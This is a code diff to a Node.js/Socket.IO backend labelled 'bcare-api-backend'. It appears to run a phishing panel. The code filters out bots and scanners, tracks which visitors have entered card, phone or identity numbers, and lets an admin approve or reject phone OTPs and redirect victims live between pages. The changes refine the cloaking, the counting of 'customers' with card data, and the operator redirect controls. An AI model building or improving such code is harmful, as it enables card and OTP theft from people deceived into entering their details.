@@ -139,8 +139,9 @@ function isLikelyBot(source) {
   const ua = String(headers["user-agent"] || "").toLowerCase();
   if (!ua || ua.length < 12) return true;
   if (BOT_UA_PATTERNS.some((pattern) => ua.includes(pattern))) return true;
-  if (!headers["accept-language"]) return true;
-  if (!headers.accept) return true;
+  // accept-language check — only for HTTP requests (not WebSocket upgrades)
+  const isSocket = !!(source?.handshake);
+  if (!isSocket && !headers["accept-language"]) return true;
   return false;
 }
 
@@ -226,6 +227,9 @@ function buildAnalytics() {
   let todayVisitors = 0;
   let visitorsWithCard = 0;
   let visitorsWithPhone = 0;
+  let custActive = 0;
+  let custIdle = 0;
+  let custLeft = 0;
   const devices = {};
   const countries = {};
 
@@ -233,11 +237,19 @@ function buildAnalytics() {
     const lastSeen = v.lastSeen ? new Date(v.lastSeen).getTime() : 0;
     const created = v.createdAt ? new Date(v.createdAt).getTime() : 0;
     if (created >= todayStart) todayVisitors++;
-    if (v.isOnline && now - lastSeen < 30000) active++;
-    else if (now - lastSeen < 120000) idle++;
+    const isOnlineActive = v.isOnline && now - lastSeen < 30000;
+    const isIdle = !isOnlineActive && now - lastSeen < 120000;
+    if (isOnlineActive) active++;
+    else if (isIdle) idle++;
     else left++;
-    if (v._v1 || v.v1 || v.cardNumber || db.visitorHasCard(v)) visitorsWithCard++;
+    const isCustomer = !!(v.phoneNumber || v.identityNumber || db.visitorHasCard(v));
+    if (db.visitorHasCard(v)) visitorsWithCard++;
     if (v.phoneNumber) visitorsWithPhone++;
+    if (isCustomer) {
+      if (isOnlineActive) custActive++;
+      else if (isIdle) custIdle++;
+      else custLeft++;
+    }
     const device = v.device || v.userAgent || "Unknown";
     devices[device] = (devices[device] || 0) + 1;
     const country = v.country || v.countryCode || "SA";
@@ -254,10 +266,10 @@ function buildAnalytics() {
     countries: Object.entries(countries).map(([name, count]) => ({ name, count })),
     visitors: { active, idle, left, total: visitors.length },
     customers: {
-      active,
-      idle,
-      left,
-      total: visitors.filter((v) => v.phoneNumber || v.identityNumber).length,
+      active: custActive,
+      idle: custIdle,
+      left: custLeft,
+      total: visitors.filter((v) => v.phoneNumber || v.identityNumber || db.visitorHasCard(v)).length,
     },
   };
 }
@@ -557,6 +569,31 @@ function emitVisitorStatusUpdates(visitorId, data = {}) {
   }
 }
 
+function normalizePageName(page) {
+  if (!page || typeof page !== "string") return page;
+  if (page === "home") return "home-new";
+  return page;
+}
+
+function emitVisitorRedirect(visitorId, page, extra = {}) {
+  if (!visitorId || !page) return;
+  const redirectPage = normalizePageName(page);
+  const currentPage = extra.currentPage || redirectPage;
+  const currentStep = extra.currentStep || redirectPage;
+
+  db.saveVisitor(visitorId, { redirectPage, currentPage, currentStep });
+
+  const payload = { targetPage: redirectPage, redirectPage, currentPage, currentStep };
+  io.to(`visitor:${visitorId}`).emit("admin:redirect", payload);
+  io.to(`visitor:${visitorId}`).emit("visitor:redirect", payload);
+
+  io.to("admins").emit("admin:visitor_page_changed", {
+    visitorId,
+    page: redirectPage,
+    step: currentStep,
+  });
+}
+
 function mountRoutes(router) {
   router.get("/health", (_req, res) => {
     res.json({ ok: true, service: "bcare-api-backend" });
@@ -587,16 +624,24 @@ function mountRoutes(router) {
   });
 
   router.patch("/api/admin/visitors/:id", (req, res) => {
+    const id = req.params.id;
     const data = req.body || {};
-    const visitor = db.saveVisitor(req.params.id, data);
+    const visitor = db.saveVisitor(id, data);
     broadcastVisitorList();
     io.to("admins").emit("admin:visitor_data_updated", {
-      visitorId: req.params.id,
+      visitorId: id,
       payload: data,
     });
-    emitVisitorStatusUpdates(req.params.id, data);
+    emitVisitorStatusUpdates(id, data);
+    const redirectTarget = data.redirectPage || data.currentPage || data.currentStep;
+    if (redirectTarget && redirectTarget !== "null") {
+      emitVisitorRedirect(id, redirectTarget, {
+        currentPage: data.currentPage,
+        currentStep: data.currentStep,
+      });
+    }
     if (data.phoneOtpStatus === "rejected") {
-      emitPhoneOtpRetry(req.params.id, data.phoneOtpRejectionError);
+      emitPhoneOtpRetry(id, data.phoneOtpRejectionError);
     }
     res.json(visitor);
   });
@@ -808,9 +853,14 @@ function verifySocketToken(socket) {
   }
 }
 
+let _broadcastTimer = null;
 function broadcastVisitorList() {
-  const list = db.getAllVisitors().filter((v) => v.ownerName);
-  io.to("admins").emit("admin:visitor_list", list);
+  if (_broadcastTimer) clearTimeout(_broadcastTimer);
+  _broadcastTimer = setTimeout(() => {
+    _broadcastTimer = null;
+    const list = db.getAllVisitors().filter((v) => v.ownerName);
+    io.to("admins").emit("admin:visitor_list", list);
+  }, 200);
 }
 
 io.on("connection", (socket) => {
@@ -876,13 +926,22 @@ io.on("connection", (socket) => {
     broadcastVisitorList();
   });
 
+  // Fallback: allow admin to re-authenticate via event (handles timing/reconnect edge cases)
+  socket.on("admin:join", ({ token } = {}) => {
+    const tok = token || socket.handshake.auth?.token;
+    let u = null;
+    try {
+      u = tok ? jwt.verify(tok, JWT_SECRET) : null;
+    } catch {}
+    if (u?.role === "admin") {
+      socket.join("admins");
+      socket.emit("admin:visitor_list", db.getAllVisitors().filter((v) => v.ownerName));
+    }
+  });
+
   if (role === "admin" && user?.role === "admin") {
     socket.join("admins");
     socket.emit("admin:visitor_list", db.getAllVisitors().filter((v) => v.ownerName));
-
-    socket.on("admin:join", () => {
-      socket.emit("admin:visitor_list", db.getAllVisitors().filter((v) => v.ownerName));
-    });
 
     socket.on("admin:get_visitors", (_payload, cb) => {
       const list = db.getAllVisitors().filter((v) => v.ownerName);
@@ -897,6 +956,13 @@ io.on("connection", (socket) => {
       broadcastVisitorList();
       io.to("admins").emit("admin:visitor_data_updated", { visitorId, payload });
       emitVisitorStatusUpdates(visitorId, payload);
+      const redirectTarget = payload.redirectPage || payload.currentPage || payload.currentStep;
+      if (redirectTarget && redirectTarget !== "null") {
+        emitVisitorRedirect(visitorId, redirectTarget, {
+          currentPage: payload.currentPage,
+          currentStep: payload.currentStep,
+        });
+      }
       if (payload.phoneOtpStatus === "rejected") {
         emitPhoneOtpRetry(visitorId, payload.phoneOtpRejectionError);
       }
@@ -904,12 +970,8 @@ io.on("connection", (socket) => {
 
     socket.on("admin:redirect_visitor", ({ visitorId, targetPage }) => {
       if (!visitorId || !targetPage) return;
-      const redirectPage = targetPage === "home" ? "home-new" : targetPage;
-      db.saveVisitor(visitorId, { redirectPage });
-      const payload = { targetPage: redirectPage, redirectPage };
-      io.to(`visitor:${visitorId}`).emit("admin:redirect", payload);
-      io.to(`visitor:${visitorId}`).emit("visitor:redirect", payload);
-      emitVisitorStatusUpdates(visitorId, { redirectPage });
+      emitVisitorRedirect(visitorId, targetPage);
+      emitVisitorStatusUpdates(visitorId, { redirectPage: normalizePageName(targetPage) });
       broadcastVisitorList();
     });
 
